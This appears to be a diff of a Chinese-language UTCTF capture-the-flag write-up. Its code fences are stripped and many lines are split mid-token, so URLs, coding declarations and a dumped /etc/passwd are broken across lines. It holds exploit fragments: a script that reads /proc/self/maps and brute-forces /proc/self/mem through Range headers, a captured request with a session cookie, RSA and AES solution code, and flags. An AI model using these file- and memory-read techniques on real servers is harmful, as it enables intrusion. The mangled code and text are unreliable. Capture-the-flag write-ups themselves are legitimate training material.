@@ -293,11 +293,11 @@ body = (
 
 + escape(dir_name)
 
-+ “</title><body><h1>Directory listing of “ + escape(dir_name) + “</h1><ul>”
++ “</title><h1>Directory listing of “ + escape(dir_name) + “</h1>”
 
 + “”.join([“<li><a href=”” + escape(child, quote=True) + “”>” + escape(child) + “</a></li>” for child in os.listdir(f)])
 
-+ “</ul></body></html>”
++ “</html>”
 
 ).encode(“utf-8”)
 
@@ -345,12 +345,14 @@ f.write(the_flag)
 
 从/proc/self/maps来获取堆栈分布,根据堆的偏移爆破mem
 
-# -*- coding:utf-8 -*-
+# -*- coding:
+utf-8 -*-
 import requests
 import re
 from tqdm import tqdm
 from urllib.parse import quote
-baseUrl = "http://guppy.utctf.live:7884/"
+baseUrl = "http://guppy.utctf.live:
+7884/"
 headers = {
     "Range":"bytes=40000-42000"
 }
@@ -405,51 +407,81 @@ Beginner: Basic Reversing Problem
 
 ```
 POST /api/absorbCompany/2 HTTP/1.1
-Host: guppy.utctf.live:8725
+Host: guppy.utctf.live:
+8725
 Accept: */*
 Accept-Encoding: identity
 Accept-Language: zh-CN,zh;q=0.9
 Content-Length: 37
 Content-Type: application/json
 Cookie: connect.sid=s%3A2Pg-Z6Ptae78uzMfAGEO2LQyaBUZF6yl.kVN2lVXSTr3ZQOOlz3L5K3Lbq%2BsPH7%2FyKZD25YRlTGk
-Origin: http://guppy.utctf.live:8725
-Referer: http://guppy.utctf.live:8725/
+Origin: http://guppy.utctf.live:
+8725
+Referer: http://guppy.utctf.live:
+8725/
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
-```
-
-
-
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+root:x:0:0:
+root:/root:/bin/bash
+daemon:x:1:1:
+daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:
+bin:/bin:/usr/sbin/nologin
+sys:x:3:3:
+sys:/dev:/usr/sbin/nologin
+sync:x:4:
+65534:
+sync:/bin:/bin/sync
+games:x:5:60:
+games:/usr/games:/usr/sbin/nologin
+man:x:6:12:
+man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
-copenhagen:x:1000:1000::/home/copenhagen:/bin/sh
-```
-
-
-
-```
+mail:x:8:8:
+mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:
+news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:
+uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:
+proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:
+www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:
+backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:
+Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:
+ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:
+Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:
+65534:
+65534:
+nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:
+100:
+65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:
+101:
+102:
+systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:
+102:
+103:
+systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:
+103:
+104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:
+104:
+105:
+systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+sshd:x:
+105:
+65534::/run/sshd:/usr/sbin/nologin
+copenhagen:x:
+1000:
+1000::/home/copenhagen:/bin/sh
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 import os
 from html import escape
@@ -459,17 +491,14 @@ from random import randbytes
 import signal
 import sys
 import threading
-```
-
-
-
-```
-# -*- coding:utf-8 -*-
+# -*- coding:
+utf-8 -*-
 import requests
 import re
 from tqdm import tqdm
 from urllib.parse import quote
-baseUrl = "http://guppy.utctf.live:7884/"
+baseUrl = "http://guppy.utctf.live:
+7884/"
 headers = {
     "Range":"bytes=40000-42000"
 }
@@ -480,11 +509,6 @@ if __name__ == "__main__":
     memInfoList = requests.get(url,headers=headers).text.split("n")
     mem = ""
     print(memInfoList)
-```
-
-
-
-```
 fetch('/click', {
                         method: 'POST',
                         headers: {
@@ -496,11 +520,6 @@ fetch('/click', {
                     .then(data => {
                         alert(data.flag);
                     });
-```
-
-
-
-```
 from Crypto.Util.number import *
 p=1025252665848145091840062845209085931
 q=75575216771551332467177108987001026743883
@@ -510,12 +529,7 @@ c = 43711206624343807006656378470987868686365943634542525258065694164173101323
 phi=(p-1)*(q-1)
 d=inverse_mod(e,phi)
 print(long_to_bytes(int(pow(c,d,N))))
-#b'utflag{just_send_plaintext}'
-```
-
-
-
-```
+    #b'utflag{just_send_plaintext}'
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Util.number import *
@@ -524,35 +538,15 @@ def get_random_number():
     global seed
     seed = int(str(seed * seed).zfill(12)[3:9])
     return seed
-```
-
-
-
-```
 import itertools
 from string import *
 alpha_bet=ascii_lowercase
 strlist = itertools.product(alpha_bet, repeat=5)
 def judge(guess,answer):
-```
-
-
-
-```
 hmsuu hmusu hmuus hsmuu hsumu hsuum humsu humus husmu husum huums huusm mhsuu mhusu mhuus mshuu msuhu msuuh muhsu muhus mushu musuh muuhs muush shmuu shumu shuum smhuu smuhu smuuh suhmu suhum sumhu sumuh suuhm suumh uhmsu uhmus uhsmu uhsum uhums uhusm umhsu umhus umshu umsuh umuhs umush ushmu ushum usmhu usmuh usuhm usumh uuhms uuhsm uumhs uumsh uushm uusmh
-```
-
-
-
-```
 n1= 16895844090302140592659203092326754397916615877156418083775983326567262857434286784352755691231372524046947817027609871339779052340298851455825343914565349651333283551138205456284824077873043013595313773956794816682958706482754685120090750397747015038669047713101397337825418638859770626618854997324831793483659910322937454178396049671348919161991562332828398316094938835561259917841140366936226953293604869404280861112141284704018480497443189808649594222983536682286615023646284397886256209485789545675225329069539408667982428192470430204799653602931007107335558965120815430420898506688511671241705574335613090682013
 e1= 65537
 c1= 7818321254750334008379589501292325137682074322887683915464861106561934924365660251934320703022566522347141167914364318838415147127470950035180892461318743733126352087505518644388733527228841614726465965063829798897019439281915857574681062185664885100301873341937972872093168047018772766147350521571412432577721606426701002748739547026207569446359265024200993747841661884692928926039185964274224841237045619928248330951699007619244530879692563852129885323775823816451787955743942968401187507702618237082254283484203161006940664144806744142758756632646039371103714891470816121641325719797534020540250766889785919814382
-```
-
-
-
-```
 Welcome to the signature generator!
 This service generates signatures for nonnegative integer messages.
 Today's RSA parameters are: 
@@ -567,11 +561,6 @@ Now, come up with your own pair!
 Enter a message: 0
 Enter a signature: 1
 Congrats! Here is the flag: utflag{a1m05t_t3xtb00k_3x3rc153}
-```
-
-
-
-```
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from tqdm import *
